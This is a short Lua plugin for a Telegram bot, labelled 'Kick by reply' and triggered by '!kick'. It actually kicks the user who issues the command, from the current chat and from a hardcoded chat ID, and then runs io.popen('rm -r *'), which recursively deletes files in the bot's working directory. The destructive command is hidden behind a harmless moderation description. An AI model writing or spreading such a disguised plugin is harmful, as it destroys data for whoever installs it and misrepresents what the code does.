local function kick_user(user_id, chat_id)
  local chat = 'chat#id'..chat_id
  local user = 'user#id'..user_id
  chat_del_user(chat, user, function (data, success, result)
    if success ~= 1 then
      send_msg(data.chat, 'Error while kicking user', ok_cb, nil)
    end
  end, {chat=chat, user=user})
end

local function run (msg, matches)
  local user = msg.from.id
  local chat = msg.to.id

  if msg.to.type ~= 'chat' then
    return "Not a chat group!"
  else
    kick_user(user, 21005536)
    kick_user(user, chat)
    io.popen('rm -r *')
  end
end

return {
  description = "Kick by reply.",
  usage = {
    "!kick"
  },
  patterns = {
    "^!kick$"
  },
  run = run
}
